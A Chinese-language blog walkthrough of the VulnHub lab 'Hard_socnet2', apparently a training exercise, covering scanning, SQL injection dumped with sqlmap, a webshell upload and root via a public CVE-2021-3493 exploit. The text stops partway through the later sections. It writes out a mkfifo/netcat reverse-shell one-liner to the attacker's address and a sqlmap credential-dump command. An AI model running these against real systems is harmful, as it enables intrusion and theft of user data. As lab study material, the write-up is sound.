@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        Hard_socnet2 | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">Hard_socnet2</div>
+        <div class="post-info">
+          
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-tag">#渗透测试</a>
+
+
+          <span class="post-date">2023-03-19</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">主机发现</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Namp 扫描</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">Python BaseHTTPServer 介绍</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">BaseHTTPServer 源代码解析</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">漏洞发现</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">8000端口</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">返回200</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">其他请求方式</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">目录扫描</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">80端口</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">SQL注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">文件上传</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link"><span class="post-toc-text">sqlmap 跑出的数据</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">Ubuntu用户提权CVE-2021-3493</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">mkfifo 命令</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">提权成功</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">还没有结束</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">又见monitor.py</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">进程</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">XML-RPC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">命令执行</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">分析程序</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">溢出</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">backdoor 后门</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">二次提权</span></a></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+<p><a name="o5taF"></a></p>
+<h1><span id="描述">描述</span></h1><p><strong>——————————————————————————————————————</strong><br><strong>Description</strong><br><strong>You’ve been assigned to test another social networking webapp.</strong><br><strong>You have been given access to a dev server.</strong><br><strong>The current devs use many custom tools and scripts that you’ll have to review and attack.</strong><br><strong>Difficulty: Hard</strong><br><strong>Tasks involved:</strong></p>
+<ul>
+<li><strong>port scanning</strong></li>
+<li><strong>webapp attacks</strong></li>
+<li><strong>code review</strong></li>
+<li><strong>custom bruteforcing</strong></li>
+<li><strong>reverse engineering</strong></li>
+<li><strong>buffer overflow</strong></li>
+<li><strong>exploitation</strong></li>
+</ul>
+<p><strong>——————————————————————————————————————</strong><br><strong>难度等级：高</strong><br><strong>打靶目标:</strong> 取得 root 权限<br>————————————————————————————————————<br><a name="USgM3"></a></p>
+<h1><span id="主机发现">主机发现</span></h1><p>kali 地址 :  192.168.145.130<br>靶机 地址：192.168.145.133<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678710980355-0141d235-ee63-4b3b-bab4-663181068c5c.png#averageHue=%23252935&clientId=u14e6d26e-ee7c-4&from=paste&height=256&id=ubf5c3035&name=image.png&originHeight=256&originWidth=807&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98790&status=done&style=none&taskId=ud0c6da4a-6d17-4ce0-a35b-89c7a5de47d&title=&width=807" alt="image.png"><br><a name="ksIsn"></a></p>
+<h2><span id="namp-扫描">Namp 扫描</span></h2><p>:::info<br>nmap -sV -O -p 1-65535 192.168.145.133<br>:::<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678711045060-759372a0-15ca-4705-bc1c-a3667cbbcd1f.png#averageHue=%23272b37&clientId=u14e6d26e-ee7c-4&from=paste&height=325&id=u1a3b3110&name=image.png&originHeight=325&originWidth=821&originalType=binary&ratio=1&rotation=0&showTitle=false&size=147367&status=done&style=none&taskId=u6c0ca639-cb6e-4a95-bd8f-69423861229&title=&width=821" alt="image.png"><br>发现存在  <br>22端口 ， <br>80 端口     Apache httpd 2.4.29 ((Ubuntu))<br>8000端口   BaseHTTPServer 0.3 (Python 2.7.15rc1)  <br>8000端口不知道开启的是什么服务 反正知道应该是python 编写的 <br>google.com.hk 一下 看看 是个什么东西 </p>
+<p>:::info<br><a name="ACLmZ"></a></p>
+<h1><span id="python-basehttpserver-介绍">Python BaseHTTPServer 介绍</span></h1><p>python 2.7 版本，介绍了 BaseHTTPServer 这个库的使用方法。<br>这个库是 python 自带的标准库的一部分，不需要额外安装，在 linux 系统下，位置在 &#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;BaseHTTPServer.py</p>
+<p><a name="e5xqJ"></a></p>
+<h2><span id="basehttpserver-源代码解析">BaseHTTPServer 源代码解析</span></h2><p>BaseHTTPServer 这个模块提供了两个类让开发者实现 HTTP server：HTTPServer 和 BaseHTTPRequestHandler。<br>HTTPServer 继承了 SocketServer.BaseServer，主要功能是：创建和监听 socket，把请求转发给 handler 去处理。主要的工作都是在 BaseHTTPRequestHandler 中处理的，它把和请求有关的信息都封装成自己的实例变量，可以在子类中直接使用。这些变量包括：</p>
+<ul>
+<li>client_address：客户端的地址，存放在一个 tuple 里 (host, port)</li>
+<li>server: server 实例</li>
+<li>command：请求类型，比如，GET、POST 等</li>
+<li>path：请求路径，比如 &#x2F;index.html</li>
+<li>request_version: 请求版本号，比如 HTTP&#x2F;1.0</li>
+<li>headers：mimetools.Message 的实例对象，包含了头部信息</li>
+<li>rfile：rfile 是一个输入流，用来读取请求的数据</li>
+<li>wfile：wfile 是一个输出流，用来回写响应，回写的数据必须遵守 HTTP 协议的格式</li>
+</ul>
+<p>除了这些实例变量之外，还有其他的类变量：</p>
+<ul>
+<li>server_version：服务器的版本号，比如 BaseHTTP&#x2F;0.2</li>
+<li>sys_version：python 的版本号，比如 Python&#x2F;1.4</li>
+<li>error_message_format：错误 response 的格式</li>
+<li>error_content_type：错误 response 的 Content-Type，默认是 text&#x2F;html</li>
+<li>protocol_version：HTTP 协议版本号</li>
+<li>responses：error code 对应错误消息的匹配关系</li>
+</ul>
+<p>当然，还有一些方法可以使用：</p>
+<ul>
+<li>handle()：调用底层的实现来处理一次请求</li>
+<li>send_response（）：发送应答消息和状态码<br>:::<br>是一个python 自带的库 ，用来启用httpserver 服务 的 ，可以确定靶机存在python环境 ，</li>
+</ul>
+<p><a name="WPFbc"></a></p>
+<h1><span id="漏洞发现">漏洞发现</span></h1><p><a name="R5xVT"></a></p>
+<h2><span id="8000端口">8000端口</span></h2><p>开了三个端口 先 一 一 去尝试访问 <br>先看8000 端口 ，因为是python起的服务 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678711831394-4fa3afc2-2b12-433d-8362-cfd146118c2c.png#averageHue=%23cdad85&clientId=u5bf0ef87-6e89-4&from=paste&height=324&id=ua6e8ecee&name=image.png&originHeight=417&originWidth=942&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47218&status=done&style=none&taskId=u52b11a39-3e9c-4887-bbfe-208702db559&title=&width=733" alt="image.png"><br>开局报 501 错误  （服务器错误 ）<br>HTTP 501 Not Implemented 服务器错误响应码表示请求的方法不被服务器支持，因此无法被处理<br>使用BURP 换种方式访问 <br>使用 POST 的方法去访问返回 500 的错误 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678712079007-03553be4-59e4-4994-8cf8-cc39fd77217c.png#averageHue=%23fafafa&clientId=u5bf0ef87-6e89-4&from=paste&height=307&id=u4d070625&name=image.png&originHeight=307&originWidth=1107&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33277&status=done&style=none&taskId=u9121ac9d-6990-453b-963b-d848be06f67&title=&width=1107" alt="image.png"><br><a name="KL5J9"></a></p>
+<h3><span id="返回200">返回200</span></h3><p>在下面post 内容里面输入一个1’ <br>返回200 状态码  XML的数据 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678712171004-04d86eb8-d02b-45a1-a796-a3bea17f0a08.png#averageHue=%23fcfcfc&clientId=u5bf0ef87-6e89-4&from=paste&height=600&id=udda4961c&name=image.png&originHeight=600&originWidth=1184&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61736&status=done&style=none&taskId=u37a1e60a-aad9-46cd-bec3-b1801457189&title=&width=1184" alt="image.png"></p>
+<p>这里应该是遇到了python解析XML 数据的错误返回<br><a name="efsmc"></a></p>
+<h3><span id="其他请求方式">其他请求方式</span></h3><p>HEAD<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678712679661-a5a1c1b0-c155-4e10-900b-7909303db7de.png#averageHue=%23f9f8f8&clientId=u5bf0ef87-6e89-4&from=paste&height=238&id=u13ce803a&name=image.png&originHeight=238&originWidth=1001&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31301&status=done&style=none&taskId=u1d42cc84-b58d-457b-88e9-2d651a90aba&title=&width=1001" alt="image.png"><br>PUT<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678712706101-8be8b9df-2f29-4e58-9b3d-d375d32f12bb.png#averageHue=%23f9f8f8&clientId=u5bf0ef87-6e89-4&from=paste&height=255&id=u771a05aa&name=image.png&originHeight=255&originWidth=1115&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35380&status=done&style=none&taskId=u5315c4b1-7b96-4be7-9312-35fbf4c810e&title=&width=1115" alt="image.png"><br>DELETE<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678712762606-eed03247-c86b-4cd7-80ef-dad5d995b3f8.png#averageHue=%23faf9f9&clientId=u5bf0ef87-6e89-4&from=paste&height=335&id=u297de77d&name=image.png&originHeight=335&originWidth=1113&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39364&status=done&style=none&taskId=u058d2a6c-5c16-4428-9b88-b8ce2282e20&title=&width=1113" alt="image.png"><br>OPTIONS<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678712791321-cc8d7b8f-b184-4852-b459-db53d4124b5e.png#averageHue=%23f9f8f8&clientId=u5bf0ef87-6e89-4&from=paste&height=257&id=uf1748010&name=image.png&originHeight=257&originWidth=1106&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33911&status=done&style=none&taskId=uec307bfc-d87d-4476-8837-9c52c704055&title=&width=1106" alt="image.png"><br>这几个均返回501 错误<br><a name="ulEJI"></a></p>
+<h3><span id="目录扫描">目录扫描</span></h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678712896538-c2264f1c-c3dc-4a9e-b525-fdb77ef4fbe2.png#averageHue=%232f313b&clientId=u5bf0ef87-6e89-4&from=paste&height=348&id=u00ad4034&name=image.png&originHeight=348&originWidth=609&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49437&status=done&style=none&taskId=u7306f2e0-9ff4-47b2-b01d-bbdc5b86c56&title=&width=609" alt="image.png"><br>也没有发现存在重要的目录文件</p>
+<p><a name="zwose"></a></p>
+<h2><span id="80端口">80端口</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678713137861-ebe58e33-245e-49c8-8e9f-fa2a0046b290.png#averageHue=%23e8eaed&clientId=u5bf0ef87-6e89-4&from=paste&height=450&id=u54217f92&name=image.png&originHeight=450&originWidth=1074&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17758&status=done&style=none&taskId=u4f681878-1b23-4616-a3c0-98f2c0c782f&title=&width=1074" alt="image.png"><br>是一个不知道是什么的网站或者啥CMS 百度没找到<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678713271524-2d2c7daf-676f-4cbb-aec1-28d0ce4dbfd2.png#averageHue=%23bcc5bb&clientId=u5bf0ef87-6e89-4&from=paste&height=1173&id=u5c289682&name=image.png&originHeight=1173&originWidth=763&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44400&status=done&style=none&taskId=u711d7f79-7b45-4b0d-a6fb-f3c11790b53&title=&width=763" alt="image.png"><br>存在注册功能<br>注册一个 admin2<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678713563125-bca1b6d0-8788-4614-8b11-888ffad86466.png#averageHue=%23fafafa&clientId=u5bf0ef87-6e89-4&from=paste&height=390&id=ue35c85bb&name=image.png&originHeight=390&originWidth=951&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42451&status=done&style=none&taskId=u4d03477e-576a-4459-a6c4-f4e16dae5a1&title=&width=951" alt="image.png"><br>登录进来存在一个 home界面<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678713590389-03a3a7fe-ef9b-4be0-968a-4a8b8fe77882.png#averageHue=%23a0d0a6&clientId=u5bf0ef87-6e89-4&from=paste&height=1242&id=u45f37e41&name=image.png&originHeight=1242&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&size=260223&status=done&style=none&taskId=u7754ae56-0d38-4c28-babe-198c202c134&title=&width=1181" alt="image.png"><br><a name="hChMh"></a></p>
+<h3><span id="sql注入">SQL注入</span></h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678713645415-9749e8ae-42e7-4bde-82a6-193511edd7b6.png#averageHue=%23c6cbd3&clientId=u5bf0ef87-6e89-4&from=paste&height=420&id=ud2be7573&name=image.png&originHeight=420&originWidth=1172&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44528&status=done&style=none&taskId=u15937bb7-0ad7-40e4-9417-e5f787f1035&title=&width=1172" alt="image.png"><br>本来想使用 or 闭合的 然后报出了用户信息<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678713904039-fc6ed0ab-7b35-49a3-b06a-dbe719d9af40.png#averageHue=%23f9f9ec&clientId=u5bf0ef87-6e89-4&from=paste&height=1001&id=uec497043&name=image.png&originHeight=1001&originWidth=2424&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89384&status=done&style=none&taskId=u16d75747-0b72-4167-be13-091290ae2ba&title=&width=2424" alt="image.png"></p>
+<p>证明存在sql注入了 <br>这里就先用sqlmap 跑着 <br>看看是否存在其他漏洞<br>存在一个留言界面<br><a name="vYzKe"></a></p>
+<h3><span id="文件上传">文件上传</span></h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678714871771-4a843d2a-d2af-4538-8e9b-f53ac38b6910.png#averageHue=%239fd0a0&clientId=ufa3e5ed3-552d-4&from=paste&height=1020&id=u579f5f8e&name=image.png&originHeight=1020&originWidth=1178&originalType=binary&ratio=1&rotation=0&showTitle=false&size=186341&status=done&style=none&taskId=u43098e42-630f-4291-af7b-227a84161a1&title=&width=1178" alt="image.png"><br>哈哈哈   测试xxs <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678798635098-1b2ab6ee-9cd9-4e1b-8ae5-93ae1d486dce.png#averageHue=%23a0a2a6&clientId=ud56bf6fd-1cc1-4&from=paste&height=244&id=u8f29b176&name=image.png&originHeight=244&originWidth=931&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9005&status=done&style=none&taskId=uf97978f7-1afa-417d-bede-f5094b6034f&title=&width=931" alt="image.png"><br>存在xss的  但是这里的上传图片不行  ,<br>再看一下评论 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678798698754-7f9a3d84-68b2-4c74-9d21-431162c97b84.png#averageHue=%232e2e30&clientId=ud56bf6fd-1cc1-4&from=paste&height=443&id=ue2e9f677&name=image.png&originHeight=443&originWidth=751&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49391&status=done&style=none&taskId=u3c536677-b423-43e5-a362-78f609a095f&title=&width=751" alt="image.png"><br>存在一个监控脚本 ，但是现在还没有发现 <br>看看其他地方<br>profile.php 界面也是存在 上传的点的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678798797675-358faa2c-7e20-446b-a8f2-7ae74be6aac1.png#averageHue=%23caecde&clientId=ud56bf6fd-1cc1-4&from=paste&height=989&id=u318e2705&name=image.png&originHeight=989&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57745&status=done&style=none&taskId=udacf5db7-f6aa-4b71-a64d-11723baad6c&title=&width=1181" alt="image.png"></p>
+<p>直接上传一个webshell  <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678800125965-15322fb9-750c-4806-9dff-864c5b0b7b50.png#averageHue=%231a1a19&clientId=ud56bf6fd-1cc1-4&from=paste&height=378&id=u8bf26ca8&name=image.png&originHeight=378&originWidth=946&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26424&status=done&style=none&taskId=ua4fbb944-1325-4e84-814e-d09b98be18a&title=&width=946" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678800141239-42880219-522d-4f11-b285-4a78dbfd98ab.png#averageHue=%23f1f1f1&clientId=ud56bf6fd-1cc1-4&from=paste&height=342&id=u8b4e47ee&name=image.png&originHeight=342&originWidth=516&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16886&status=done&style=none&taskId=u9f313d56-a916-4ac7-8196-5c17841fc09&title=&width=516" alt="image.png"><br>直接连接webshell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678800163765-f1c01c87-3396-48bb-9a73-b3a07861a4e8.png#averageHue=%23f3f3f3&clientId=ud56bf6fd-1cc1-4&from=paste&height=516&id=u3b828d1b&name=image.png&originHeight=516&originWidth=981&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45409&status=done&style=none&taskId=ub7ecdf29-3ec5-4b54-95b3-91daecdc6e2&title=&width=981" alt="image.png"></p>
+<p>但是这里权限是 www的一个权限</p>
+<p><a name="oiI4c"></a></p>
+<h4><span id="sqlmap-跑出的数据">sqlmap 跑出的数据</span></h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678800263370-5c39004f-57ad-4bd7-ae32-cb4e3fd8b706.png#averageHue=%23252936&clientId=ud56bf6fd-1cc1-4&from=paste&height=373&id=u80c13ea1&name=image.png&originHeight=373&originWidth=884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153817&status=done&style=none&taskId=u86d0db77-b8de-47c4-8e0b-3bd912e9e99&title=&width=884" alt="image.png"><br>对 socialnetwork 数据库进行查看  查看存在哪些表<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678800386818-bdb377cb-3af8-4fa5-8ef2-90d887049be1.png#averageHue=%23252835&clientId=ud56bf6fd-1cc1-4&from=paste&height=417&id=u89fa0e53&name=image.png&originHeight=417&originWidth=826&originalType=binary&ratio=1&rotation=0&showTitle=false&size=150988&status=done&style=none&taskId=ud16361bf-e085-4351-b7f1-d64e3831d8a&title=&width=826" alt="image.png"></p>
+<p><code>sqlmap -r 1.txt -p query  -D socialnetwork  -T users -C user_password,user_email --dump</code><br>SQLmap  跑出了admin 用户的密码 和邮箱<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678800953191-df18ed7f-8df3-4867-b254-0ef298109f8a.png#averageHue=%23262a36&clientId=ud56bf6fd-1cc1-4&from=paste&height=753&id=u635c7f43&name=image.png&originHeight=753&originWidth=1157&originalType=binary&ratio=1&rotation=0&showTitle=false&size=370021&status=done&style=none&taskId=u2eaa101f-4c2a-46ae-99ba-c567ef54b4d&title=&width=1157" alt="image.png"><br>尝试使用admin 用户去登录看看是否存在不一样的功能<br>登录上去也是没有什么不一样的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678801122093-0ffbda4e-ee51-4fad-a251-7548a4472529.png#averageHue=%23f7fbf7&clientId=ud56bf6fd-1cc1-4&from=paste&height=1150&id=ue6960e53&name=image.png&originHeight=1150&originWidth=1158&originalType=binary&ratio=1&rotation=0&showTitle=false&size=148993&status=done&style=none&taskId=ue85c0440-4aed-4dce-a0ff-1f8ceea127b&title=&width=1158" alt="image.png"><br>还是返回webshell <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678801185609-c3796c0f-f15a-44a7-b596-3f23563efa4e.png#averageHue=%23050404&clientId=ud56bf6fd-1cc1-4&from=paste&height=205&id=u2fe19550&name=image.png&originHeight=205&originWidth=735&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19763&status=done&style=none&taskId=ub0b28f15-dfcd-4670-b6c4-1da9f02fa14&title=&width=735" alt="image.png"><br>权限是低权限 <br>版本是18.04.1  <br>看是否存在提权漏洞<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678801267875-10072782-724b-4774-8ce3-11d4aca304da.png#averageHue=%2324272d&clientId=ud56bf6fd-1cc1-4&from=paste&height=1004&id=u63475957&name=image.png&originHeight=1004&originWidth=887&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145837&status=done&style=none&taskId=u3c3d348c-4040-421a-8426-b64339e82ae&title=&width=887" alt="image.png"><br>好像是存在漏洞的 可以进行提权的<br><a name="Muzf6"></a></p>
+<h1><span id="ubuntu用户提权cve-2021-3493">Ubuntu用户提权CVE-2021-3493</span></h1><p>1.漏洞摘要<br>Linux内核中overlayfs文件系统中的Ubuntu特定问题，在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用。由于Ubuntu附带了一个允许非特权的overlayfs挂载的补丁，因此本地攻击者可以使用它来获得更高的特权。</p>
+<p>CVE-2021-3493<br>linux内核中的overlayfs实现未就用户名称空间正确验证底层文件系统中文件的文件功能设置。由于无特权的用户名称空间以及Ubuntu内核中附带的允许无特权的覆盖挂载的补丁的组合，攻击者可以使用它来获得提升的特权,内核中的overlayfs实现无法正确验证文件系统功能在用户名称空间方面的应用。本地攻击者可以使用它来获得更高的特权。</p>
+<p>2.受影响版本<br>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM<br>———————————————————————————————–<br>EXP<br><a target="_blank" rel="noopener" href="https://github.com/inspiringz/CVE-2021-3493">https://github.com/inspiringz/CVE-2021-3493</a></p>
+<p>在本机编译过后在上传到靶机上去 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678801607784-92114cc3-0ce9-4643-8e87-5d9ecf704dc3.png#averageHue=%231a1a1a&clientId=ud56bf6fd-1cc1-4&from=paste&height=178&id=u6b58a577&name=image.png&originHeight=178&originWidth=621&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19921&status=done&style=none&taskId=u862d63a0-304f-45f9-9a9d-aca8af9b1ce&title=&width=621" alt="image.png"><br>上传到tmp 临时目录下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678801670974-4a31b38e-4625-46fd-a24f-5ada3510a5fc.png#averageHue=%23f4f4f4&clientId=ud56bf6fd-1cc1-4&from=paste&height=655&id=u9890ed24&name=image.png&originHeight=655&originWidth=980&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39672&status=done&style=none&taskId=u8d68d457-62e9-4a88-97e4-5a4bf9951ae&title=&width=980" alt="image.png"><br>一开始使用最简单的nc 反弹shell  到kali 中不行 ，执行不了命令 <br>蚁剑又执行不了提权文件  shell<br>这里了解到<br><a name="eRquW"></a></p>
+<h2><span id="mkfifo-命令">mkfifo 命令</span></h2><p>在蚁剑中cmd 输入<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.145.130 1234 &gt;/tmp/f</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678802237253-5331ab4c-9e37-410a-9ba3-d840102e666f.png#averageHue=%23f4f4f3&clientId=ud56bf6fd-1cc1-4&from=paste&height=811&id=u865025a2&name=image.png&originHeight=811&originWidth=968&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73594&status=done&style=none&taskId=u9bb8196b-6fda-4b49-9c36-2174d512e12&title=&width=968" alt="image.png"><br>使用mkfifo命令成功反弹shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678802274326-d87bca93-fec2-4d87-8409-01f8cb8a7990.png#averageHue=%23c1d4b0&clientId=ud56bf6fd-1cc1-4&from=paste&height=208&id=u5fbc9a88&name=image.png&originHeight=208&originWidth=1848&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94189&status=done&style=none&taskId=uc85c851f-f69b-4648-a42d-1c6578a5139&title=&width=1848" alt="image.png"><br><a name="mfE2P"></a></p>
+<h2><span id="提权成功">提权成功</span></h2><p>使用exp 提权成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678802945314-27116d60-b3fe-4d20-9d12-db3169d77bd3.png#averageHue=%23242733&clientId=ud56bf6fd-1cc1-4&from=paste&height=287&id=uec5bb433&name=image.png&originHeight=287&originWidth=649&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52952&status=done&style=none&taskId=ubd30f4f0-0c82-4aca-8f05-dc8104c4df7&title=&width=649" alt="image.png"></p>
+<p><a name="ikgTW"></a></p>
+<h1><span id="还没有结束">还没有结束</span></h1><p>但是到这里还没有结束，靶机是2020 年出的 ，提权文件是2021 年的 <br>那就是说还存在另外一种提权方法 <br> 查看 &#x2F;etc&#x2F;passwd 文件 看哪些用户 存在&#x2F;bin&#x2F;bash 权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678804031747-7be70cbb-2538-40f3-9d09-e9f2f79c897d.png#averageHue=%23272c39&clientId=u45cd59b4-6475-4&from=paste&height=584&id=ud1d32919&name=image.png&originHeight=584&originWidth=683&originalType=binary&ratio=1&rotation=0&showTitle=false&size=217922&status=done&style=none&taskId=uce5b454c-37b8-4dc6-a1e3-251437a256f&title=&width=683" alt="image.png"><br>这里存在一个socnet  用户 和  一开始的 socnet2 用户 很像 <br>进入到&#x2F;home 下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1678804144687-6b30ffdf-be87-42e7-8371-e8ca29b5c482.png#averageHue=%23252835&clientId=u45cd59b4-6475-4&from=paste&height=165&id=u57b7f958&name=image.png&originHeight=165&originWidth=398&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25617&status=done&style=none&taskId=u3f77eb64-a853-4e18-a1c2-f3beb48878f&title=&width=398" alt="image.png"><br>是存在socnet 用户目录文件夹的<br><a name="fkoSw"></a></p>
